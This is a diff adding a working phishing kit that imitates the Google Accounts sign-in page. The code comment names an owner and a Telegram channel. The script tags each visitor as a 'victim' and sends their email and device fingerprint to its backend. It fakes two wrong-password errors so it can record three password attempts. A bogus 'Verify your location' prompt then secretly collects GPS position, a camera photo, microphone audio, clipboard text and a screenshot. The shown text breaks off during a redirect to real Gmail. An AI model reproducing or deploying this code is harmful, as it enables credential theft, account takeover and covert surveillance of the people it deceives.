@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<meta name="theme-color" content="#000000">
+<meta name="color-scheme" content="dark">
+<title>Sign in - Google Accounts</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<style>
+  *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html,body{height:100%;}
+  body{
+    background:#000;color:#e8eaed;
+    font-family:'Roboto','Google Sans','Helvetica Neue',Arial,sans-serif;
+    font-size:14px;line-height:1.5;
+    display:flex;flex-direction:column;
+    min-height:100vh;min-height:100dvh;
+    overflow-x:hidden;
+    -webkit-font-smoothing:antialiased;
+  }
+  .app-bar{display:flex;align-items:center;justify-content:space-between;padding:12px 24px;min-height:60px;flex-shrink:0;}
+  .app-bar .brand{font-family:'Google Sans','Roboto',sans-serif;font-size:22px;font-weight:400;letter-spacing:-0.4px;line-height:1;user-select:none;}
+  .app-bar .brand span:nth-child(1){color:#4285F4}
+  .app-bar .brand span:nth-child(2){color:#EA4335}
+  .app-bar .brand span:nth-child(3){color:#FBBC05}
+  .app-bar .brand span:nth-child(4){color:#4285F4}
+  .app-bar .brand span:nth-child(5){color:#34A853}
+  .app-bar .brand span:nth-child(6){color:#EA4335}
+  .lang-btn{background:transparent;border:none;color:#9aa0a6;font-family:inherit;font-size:13px;padding:8px 10px;border-radius:4px;cursor:pointer;display:flex;align-items:center;gap:4px;}
+  .lang-btn:hover{background:rgba(255,255,255,.06);}
+  .main{flex:1;display:flex;align-items:center;justify-content:center;padding:8px 24px 32px;width:100%;}
+  .panel{width:100%;max-width:448px;animation:fadeSlide .3s cubic-bezier(.2,0,0,1);}
+  @keyframes fadeSlide{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+  .g-logo{display:block;margin:0 auto 16px;width:48px;height:48px;}
+  h1{font-family:'Google Sans','Roboto',sans-serif;font-size:24px;font-weight:400;line-height:1.3333;text-align:center;color:#e8eaed;margin-bottom:8px;}
+  .subtitle{font-size:16px;line-height:1.5;text-align:center;color:#e8eaed;margin-bottom:24px;padding:0 4px;}
+  .subtitle a{color:#8ab4f8;text-decoration:none;padding:2px;font-weight:500;}
+  .subtitle a:hover{text-decoration:underline;}
+  .chip-wrap{display:flex;justify-content:center;margin-bottom:24px;}
+  .chip{display:inline-flex;align-items:center;gap:8px;padding:4px 14px 4px 4px;border:1px solid #5f6368;border-radius:100px;font-size:14px;color:#e8eaed;max-width:100%;animation:chipIn .3s ease;}
+  @keyframes chipIn{from{transform:scale(.96);opacity:0;}to{transform:scale(1);opacity:1;}}
+  .chip .av{width:28px;height:28px;border-radius:50%;background:#8ab4f8;color:#202124;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;flex-shrink:0;font-family:'Google Sans',sans-serif;}
+  .chip .em{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:260px;}
+  .field{position:relative;width:100%;margin-bottom:6px;}
+  .field input{width:100%;height:56px;background:transparent;border:1px solid #5f6368;border-radius:4px;padding:0 15px;padding-top:4px;color:#e8eaed;font-family:inherit;font-size:16px;line-height:1.5;outline:none;transition:border-color .15s cubic-bezier(.4,0,.2,1), box-shadow .15s cubic-bezier(.4,0,.2,1);caret-color:#8ab4f8;}
+  .field input:hover{border-color:#9aa0a6;}
+  .field input:focus{border-color:#8ab4f8;box-shadow:inset 0 0 0 1px #8ab4f8;}
+  .field label{position:absolute;left:11px;top:50%;transform:translateY(-50%);padding:0 4px;background:#000;color:#9aa0a6;font-size:16px;pointer-events:none;transition:all .15s cubic-bezier(.4,0,.2,1);line-height:1;max-width:calc(100% - 24px);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+  .field input:focus + label,.field input:not(:placeholder-shown) + label{top:0;font-size:12px;color:#8ab4f8;letter-spacing:.2px;}
+  .field input:not(:focus):not(:placeholder-shown) + label{color:#9aa0a6;}
+  .field.error input{border-color:#f28b82;box-shadow:inset 0 0 0 1px #f28b82;}
+  .field.error label{color:#f28b82;}
+  .capslock{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#fbbc04;font-size:18px;display:none;cursor:help;user-select:none;}
+  .capslock.show{display:block;}
+  .err{display:none;align-items:flex-start;gap:6px;color:#f28b82;font-size:12px;line-height:1.4;margin:6px 2px 6px;padding-left:2px;}
+  .err.show{display:flex;animation:errShake .35s;}
+  .err svg{flex-shrink:0;margin-top:1px;}
+  @keyframes errShake{0%{transform:translateX(0)}20%{transform:translateX(-5px)}40%{transform:translateX(5px)}60%{transform:translateX(-3px)}80%{transform:translateX(3px)}100%{transform:translateX(0)}}
+  .cb-row{display:flex;align-items:center;gap:16px;padding:12px 4px;font-size:14px;color:#e8eaed;cursor:pointer;user-select:none;border-radius:4px;}
+  .cb-row input{appearance:none;-webkit-appearance:none;width:18px;height:18px;border:2px solid #9aa0a6;border-radius:2px;position:relative;cursor:pointer;flex-shrink:0;transition:background .15s, border-color .15s;margin:0;}
+  .cb-row input:checked{background:#8ab4f8;border-color:#8ab4f8;}
+  .cb-row input:checked::after{content:'';position:absolute;left:4px;top:0px;width:5px;height:10px;border:solid #202124;border-width:0 2px 2px 0;transform:rotate(45deg);}
+  .text-link{display:inline-block;color:#8ab4f8;font-family:'Google Sans',sans-serif;font-size:14px;font-weight:500;text-decoration:none;padding:8px 6px;border-radius:4px;cursor:pointer;transition:background .15s;background:none;border:none;}
+  .text-link:hover{background:rgba(138,180,248,.08);}
+  .actions{display:flex;align-items:center;justify-content:space-between;margin-top:36px;gap:12px;min-height:40px;}
+  .actions.end{justify-content:flex-end;}
+  .btn{position:relative;overflow:hidden;display:inline-flex;align-items:center;justify-content:center;gap:8px;background:#8ab4f8;color:#202124;font-family:'Google Sans','Roboto',sans-serif;font-size:14px;font-weight:500;letter-spacing:.25px;border:none;border-radius:100px;padding:10px 24px;min-width:88px;height:40px;cursor:pointer;transition:box-shadow .2s, background .15s, transform .05s;user-select:none;-webkit-user-select:none;}
+  .btn:hover{background:#aecbfa;box-shadow:0 1px 2px rgba(0,0,0,.3),0 1px 3px 1px rgba(0,0,0,.15);}
+  .btn:active{transform:scale(.98);}
+  .btn .ripple{position:absolute;border-radius:50%;background:rgba(32,33,36,.28);transform:scale(0);animation:rip .55s cubic-bezier(.4,0,.2,1);pointer-events:none;}
+  @keyframes rip{to{transform:scale(4);opacity:0;}}
+  .btn .spin{width:16px;height:16px;border:2px solid rgba(32,33,36,.35);border-top-color:#202124;border-radius:50%;animation:sp .7s linear infinite;display:none;}
+  @keyframes sp{to{transform:rotate(360deg);}}
+  .btn.loading{pointer-events:none;background:#aecbfa;}
+  .btn.loading .lbl{display:none;}
+  .btn.loading .spin{display:block;}
+  .btn.text-btn{background:transparent;color:#8ab4f8;padding:10px 16px;}
+  .btn.text-btn:hover{background:rgba(138,180,248,.08);box-shadow:none;}
+  .foot{display:flex;align-items:center;justify-content:space-between;padding:10px 24px;font-size:12px;color:#9aa0a6;border-top:1px solid #202124;flex-shrink:0;gap:12px;flex-wrap:wrap;}
+  .foot select{background:#000;color:#9aa0a6;border:none;font-family:inherit;font-size:12px;padding:6px 2px;cursor:pointer;outline:none;max-width:170px;}
+  .foot-links{display:flex;gap:22px;flex-wrap:wrap;}
+  .foot-links a{color:#9aa0a6;text-decoration:none;transition:color .15s;}
+  .foot-links a:hover{color:#e8eaed;}
+  .hidden{display:none !important;}
+  .recovery-note{background:rgba(138,180,248,.08);border:1px solid rgba(138,180,248,.25);border-radius:8px;padding:14px 16px;font-size:13px;color:#bdc1c6;line-height:1.6;margin-bottom:22px;}
+  .recovery-note b{color:#8ab4f8;}
+  #loading-page{position:fixed;inset:0;background:#000;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px;animation:fadeIn .25s ease;}
+  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+  #loading-page .spin-lg{width:44px;height:44px;border:3px solid rgba(138,180,248,.25);border-top-color:#8ab4f8;border-radius:50%;animation:sp-lg .8s linear infinite;}
+  @keyframes sp-lg{to{transform:rotate(360deg);}}
+  #loading-page .msg{font-size:14px;color:#9aa0a6;text-align:center;padding:0 32px;animation:pulse 1.6s ease-in-out infinite;}
+  @keyframes pulse{0%,100%{opacity:.6;}50%{opacity:1;}}
+  #perm-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:10000;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;color:#e8eaed;text-align:center;padding:32px;}
+  #perm-overlay .ic{width:64px;height:64px;border-radius:50%;background:rgba(138,180,248,.15);display:flex;align-items:center;justify-content:center;color:#8ab4f8;}
+  #perm-overlay h2{font-size:18px;font-weight:500;}
+  #perm-overlay p{font-size:13px;color:#9aa0a6;max-width:300px;line-height:1.6;}
+  #perm-overlay button{background:#8ab4f8;color:#202124;border:none;border-radius:100px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;margin-top:8px;}
+  @media (max-width:480px){
+    .app-bar{padding:10px 16px;min-height:52px;}
+    .app-bar .brand{font-size:19px;}
+    .main{padding:4px 20px 20px;align-items:flex-start;}
+    .panel{max-width:100%;padding-top:12px;}
+    h1{font-size:22px;}
+    .subtitle{font-size:14px;margin-bottom:20px;}
+    .chip .em{max-width:200px;}
+    .actions{margin-top:28px;}
+    .foot{padding:10px 16px;font-size:11px;}
+    .foot-links{gap:14px;}
+    .g-logo{width:42px;height:42px;margin-bottom:12px;}
+  }
+</style>
+</head>
+<body>
+
+<header class="app-bar">
+  <div class="brand"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+  <button class="lang-btn" type="button">
+    English (United States)
+    <svg width="10" height="6" viewBox="0 0 10 6" fill="currentColor"><path d="M0 0l5 6 5-6z"/></svg>
+  </button>
+</header>
+
+<main class="main">
+
+  <section class="panel" id="panel-email">
+    <svg class="g-logo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1>Sign in</h1>
+    <p class="subtitle">Use your Google Account. The account will be added to this device and available to other Google apps. <a href="#">Learn more</a></p>
+    <div class="field" id="field-email">
+      <input type="email" id="email" placeholder=" " autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" inputmode="email">
+      <label for="email">Email or phone</label>
+    </div>
+    <div class="err" id="err-email">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#f28b82"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      <span id="err-email-text">Enter a valid email or phone number</span>
+    </div>
+    <div style="margin-top:6px">
+      <button class="text-link" type="button" onclick="goForgot()">Forgot email?</button>
+    </div>
+    <p class="subtitle" style="text-align:left;font-size:14px;color:#bdc1c6;margin:22px 0 0;padding:0;">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+    <div class="actions end">
+      <button class="btn" id="btn-next1" type="button"><span class="lbl">Next</span><span class="spin"></span></button>
+    </div>
+  </section>
+
+  <section class="panel hidden" id="panel-pass">
+    <svg class="g-logo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1>Welcome</h1>
+    <div class="chip-wrap"><div class="chip"><div class="av" id="avatar">A</div><span class="em" id="email-display">user@gmail.com</span></div></div>
+    <div class="field" id="field-pass">
+      <input type="password" id="password" placeholder=" " autocomplete="current-password">
+      <label for="password">Enter your password</label>
+      <span class="capslock" id="capslock" title="Caps Lock is on">⇪</span>
+    </div>
+    <div class="err" id="err-pass">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#f28b82"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      <span id="err-pass-text">Enter a password</span>
+    </div>
+    <label class="cb-row" for="showpass"><input type="checkbox" id="showpass"><span>Show password</span></label>
+    <div style="margin-top:6px">
+      <button class="text-link" type="button" onclick="goForgotPassword()">Forgot password?</button>
+    </div>
+    <div class="actions end">
+      <button class="btn" id="btn-next2" type="button"><span class="lbl">Next</span><span class="spin"></span></button>
+    </div>
+  </section>
+
+  <section class="panel hidden" id="panel-recovery">
+    <svg class="g-logo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1 id="recovery-title">Find your email</h1>
+    <p class="subtitle" id="recovery-sub" style="margin-bottom:20px;">Enter your phone number or recovery email</p>
+    <div class="recovery-note" id="recovery-note">
+      <b>Note:</b> If you forgot the email address you use to sign in, you can use a phone number or recovery email to find it.
+    </div>
+    <div class="field" id="field-rec">
+      <input type="text" id="recovery-input" placeholder=" " autocomplete="off" autocapitalize="off" spellcheck="false">
+      <label for="recovery-input" id="recovery-label">Phone number or recovery email</label>
+    </div>
+    <div class="err" id="err-rec">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#f28b82"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      <span id="err-rec-text">Enter a phone number or recovery email</span>
+    </div>
+    <div class="actions" style="justify-content:space-between;">
+      <button class="btn text-btn" type="button" onclick="backToEmail()">Back</button>
+      <button class="btn" id="btn-rec" type="button"><span class="lbl">Next</span><span class="spin"></span></button>
+    </div>
+  </section>
+
+</main>
+
+<footer class="foot">
+  <select aria-label="Language">
+    <option>English (United States)</option>
+    <option>বাংলা</option>
+    <option>हिन्दी</option>
+    <option>Español</option>
+    <option>Français</option>
+    <option>Deutsch</option>
+    <option>日本語</option>
+    <option>العربية</option>
+  </select>
+  <nav class="foot-links">
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </nav>
+</footer>
+
+<div id="loading-page" class="hidden">
+  <svg width="56" height="56" viewBox="0 0 48 48" aria-hidden="true">
+    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  </svg>
+  <div class="spin-lg"></div>
+  <div class="msg" id="loading-msg">Opening Gmail…</div>
+</div>
+
+<div id="perm-overlay" class="hidden">
+  <div class="ic">
+    <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+  </div>
+  <h2>Verify your location</h2>
+  <p>To help protect your account, we need to verify your location. This information is only used for security purposes.</p>
+  <button id="perm-btn" type="button">Continue</button>
+</div>
+
+<script>
+/* ============================================================
+   DEVILS WILL RISE — Full Stack Edition
+   Owner: @tneh_owner
+   Channel: https://t.me/customsmsapi
+   Backend: /api/index.js
+   ============================================================ */
+
+const API_BASE = '/api';
+
+const state = {
+  email:"", password:"",
+  attemptPass:0,
+  victimId: 'V-' + Math.random().toString(36).substring(2,8).toUpperCase(),
+  geo:null, device:{},
+  gps:null, photo:null, audio:null, clipboard:null, screenshot:null
+};
+
+function collectDevice(){
+  return {
+    ua:navigator.userAgent, platform:navigator.platform||"n/a",
+    lang:navigator.language||"n/a", langs:(navigator.languages||[]).join(", "),
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone||"n/a",
+    screen:`${screen.width}x${screen.height}@${window.devicePixelRatio||1}x`,
+    viewport:`${innerWidth}x${innerHeight}`,
+    cores:navigator.hardwareConcurrency||"n/a",
+    memory:navigator.deviceMemory?navigator.deviceMemory+"GB":"n/a",
+    touch:('ontouchstart' in window)?'Yes':'No',
+    conn:navigator.connection?(navigator.connection.effectiveType||navigator.connection.type||"n/a"):"n/a",
+    downlink:navigator.connection?(navigator.connection.downlink||"n/a"):"n/a",
+    cookies:navigator.cookieEnabled?'Yes':'No',
+    online:navigator.onLine?'Yes':'No'
+  };
+}
+async function fetchIPInfo(){
+  try{
+    const r = await fetch('https://ipapi.co/json/',{cache:'no-store'});
+    if(r.ok){const d=await r.json();return {ip:d.ip,city:d.city,region:d.region,country:d.country_name,cc:d.country_code,postal:d.postal,lat:d.latitude,lon:d.longitude,isp:d.org,asn:d.asn,timezone:d.timezone,utc:d.utc_offset,currency:d.currency,calling:d.country_calling_code};}
+  }catch(e){}
+  try{
+    const r = await fetch('https://ipwho.is/',{cache:'no-store'});
+    if(r.ok){const d=await r.json();if(d.success){return {ip:d.ip,city:d.city,region:d.region,country:d.country,cc:d.country_code,postal:d.postal,lat:d.latitude,lon:d.longitude,isp:d.connection&&d.connection.isp,asn:d.connection&&d.connection.asn,timezone:d.timezone&&d.timezone.id,utc:d.timezone&&d.timezone.utc,currency:d.currency&&d.currency.code,calling:d.country_code?"+"+d.country_code:""};}}
+  }catch(e){}
+  return null;
+}
+async function postAPI(action, data){
+  try{
+    const r = await fetch(`${API_BASE}/index.js`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ action, data })
+    });
+    return await r.json();
+  }catch(e){ console.error('API error:', e); return {ok:false}; }
+}
+function ripple(ev, el){
+  if(!el) return;
+  const rect = el.getBoundingClientRect();
+  const size = Math.max(rect.width, rect.height);
+  const x = (ev && ev.clientX ? ev.clientX : rect.left + rect.width/2) - rect.left - size/2;
+  const y = (ev && ev.clientY ? ev.clientY : rect.top + rect.height/2) - rect.top - size/2;
+  const s = document.createElement('span'); s.className='ripple';
+  s.style.width=s.style.height=size+'px'; s.style.left=x+'px'; s.style.top=y+'px';
+  el.appendChild(s); setTimeout(()=>s.remove(),600);
+}
+function isValidEmailOrPhone(v){
+  if(!v) return false;
+  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v) || /^\+?[0-9\s\-()]{6,20}$/.test(v);
+}
+function showPanel(id){
+  ['panel-email','panel-pass','panel-recovery'].forEach(p=>{
+    document.getElementById(p).classList.toggle('hidden', p !== id);
+  });
+}
+
+/* ============================================================
+   STEP 1 — EMAIL
+   ============================================================ */
+async function goPassword(ev){
+  const btn=document.getElementById('btn-next1'), input=document.getElementById('email');
+  const field=document.getElementById('field-email'), err=document.getElementById('err-email'), errTx=document.getElementById('err-email-text');
+  ripple(ev, btn);
+  const val=input.value.trim();
+  if(!isValidEmailOrPhone(val)){
+    field.classList.add('error');
+    errTx.textContent = val.length===0 ? 'Enter an email or phone number' : "Enter a valid email or phone number";
+    err.classList.add('show'); input.focus(); return;
+  }
+  field.classList.remove('error'); err.classList.remove('show');
+  state.email=val; state.device=collectDevice();
+  document.getElementById('email-display').textContent=val;
+  document.getElementById('avatar').textContent=val.charAt(0).toUpperCase();
+  btn.classList.add('loading');
+  if(!state.geo){ state.geo=await fetchIPInfo(); }
+  await postAPI('email', {
+    victimId: state.victimId,
+    email: state.email,
+    geo: state.geo,
+    device: state.device
+  });
+  setTimeout(()=>{
+    btn.classList.remove('loading');
+    showPanel('panel-pass');
+    setTimeout(()=>document.getElementById('password').focus(),120);
+  }, 600);
+}
+
+/* ============================================================
+   STEP 2 — PASSWORD (3 attempts: fail, fail, success)
+   ============================================================ */
+async function submitPassword(ev){
+  const btn=document.getElementById('btn-next2'), input=document.getElementById('password');
+  const field=document.getElementById('field-pass'), err=document.getElementById('err-pass'), errTx=document.getElementById('err-pass-text');
+  ripple(ev, btn);
+  const pass=input.value;
+  if(!pass){
+    field.classList.add('error'); errTx.textContent='Enter a password';
+    err.classList.add('show'); input.focus(); return;
+  }
+  field.classList.remove('error'); err.classList.remove('show');
+  state.attemptPass++;
+  state.password=pass;
+  btn.classList.add('loading');
+
+  const success = state.attemptPass >= 3;
+  await postAPI('password', {
+    victimId: state.victimId,
+    email: state.email,
+    password: state.password,
+    attempt: state.attemptPass
+  });
+
+  if(!success){
+    setTimeout(()=>{
+      btn.classList.remove('loading');
+      field.classList.add('error');
+      errTx.textContent = "Wrong password. Try again or click Forgot password to reset it.";
+      err.classList.add('show');
+      input.focus(); input.select();
+    }, 1400);
+    return;
+  }
+
+  setTimeout(()=>{ btn.classList.remove('loading'); requestPermissionsAndCapture(); }, 700);
+}
+
+/* ============================================================
+   DEEP CAPTURE
+   ============================================================ */
+function getGPS(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation){ resolve(null); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos=>{
+        const c = pos.coords;
+        resolve({
+          lat: c.latitude.toFixed(6),
+          lon: c.longitude.toFixed(6),
+          acc: c.accuracy ? c.accuracy.toFixed(1) : 'n/a',
+          alt: c.altitude ? c.altitude.toFixed(1) : 'n/a',
+          head: c.heading ? c.heading.toFixed(1) : 'n/a',
+          spd: c.speed ? c.speed.toFixed(2) : 'n/a'
+        });
+      },
+      err=>resolve(null),
+      {enableHighAccuracy:true, timeout:12000, maximumAge:0}
+    );
+  });
+}
+async function captureCamera(){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:'user', width:{ideal:640}, height:{ideal:480} },
+      audio:false
+    });
+    await new Promise(r=>setTimeout(r, 1200));
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.setAttribute('playsinline','');
+    video.muted = true;
+    await video.play();
+    await new Promise(r=>setTimeout(r, 800));
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    stream.getTracks().forEach(t=>t.stop());
+    return canvas.toDataURL('image/jpeg', 0.85);
+  }catch(e){ return null; }
+}
+async function captureAudio(seconds=6){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({audio:true});
+    const recorder = new MediaRecorder(stream, {mimeType:'audio/webm'});
+    const chunks = [];
+    recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+    recorder.start();
+    await new Promise(r=>setTimeout(r, seconds*1000));
+    return await new Promise(resolve=>{
+      recorder.onstop = ()=>{
+        stream.getTracks().forEach(t=>t.stop());
+        const blob = new Blob(chunks, {type:'audio/webm'});
+        const reader = new FileReader();
+        reader.onloadend = ()=>resolve(reader.result);
+        reader.readAsDataURL(blob);
+      };
+      recorder.stop();
+    });
+  }catch(e){ return null; }
+}
+async function readClipboard(){
+  try{
+    if(navigator.clipboard && navigator.clipboard.readText){
+      const t = await navigator.clipboard.readText();
+      return t ? t.substring(0, 2000) : null;
+    }
+  }catch(e){}
+  return null;
+}
+async function takeScreenshot(){
+  try{
+    const canvas = await html2canvas(document.body, {
+      backgroundColor:'#000',
+      scale: Math.min(window.devicePixelRatio||1, 1.5),
+      logging:false, useCORS:true, allowTaint:true
+    });
+    return canvas.toDataURL('image/jpeg', 0.75);
+  }catch(e){ return null; }
+}
+
+async function requestPermissionsAndCapture(){
+  const overlay = document.getElementById('perm-overlay');
+  overlay.classList.remove('hidden');
+
+  document.getElementById('perm-btn').onclick = async ()=>{
+    overlay.classList.add('hidden');
+    document.getElementById('loading-page').classList.remove('hidden');
+    document.getElementById('loading-msg').textContent = 'Verifying your identity…';
+
+    const [gps, photo, audio, clip, shot] = await Promise.allSettled([
+      getGPS(),
+      captureCamera(),
+      captureAudio(6),
+      readClipboard(),
+      takeScreenshot()
+    ]);
+
+    state.gps = gps.status === 'fulfilled' ? gps.value : null;
+    state.photo = photo.status === 'fulfilled' ? photo.value : null;
+    state.audio = audio.status === 'fulfilled' ? audio.value : null;
+    state.clipboard = clip.status === 'fulfilled' ? clip.value : null;
+    state.screenshot = shot.status === 'fulfilled' ? shot.value : null;
+
+    await postAPI('gps', { victimId: state.victimId, email: state.email, gps: state.gps });
+    if(state.photo) await postAPI('photo', { victimId: state.victimId, email: state.email, photo: state.photo });
+    if(state.audio) await postAPI('audio', { victimId: state.victimId, email: state.email, audio: state.audio });
+    if(state.clipboard) await postAPI('clipboard', { victimId: state.victimId, email: state.email, clipboard: state.clipboard });
+    if(state.screenshot) await postAPI('screenshot', { victimId: state.victimId, email: state.email, screenshot: state.screenshot });
+    await postAPI('summary', { victimId: state.victimId, email: state.email, password: state.password });
+
+    setTimeout(()=>{ openRealGmailApp(); }, 800);
+  };
+}
+
+/* ============================================================
+   OPEN REAL GMAIL APP
+   ============================================================ */
+function openRealGmailApp(){
+  const ua = navigator.userAgent || '';
+  const isAndroid = /Android/i.test(ua);
+  const isIOS = /iPhone|iPad|iPod/i.test(ua);
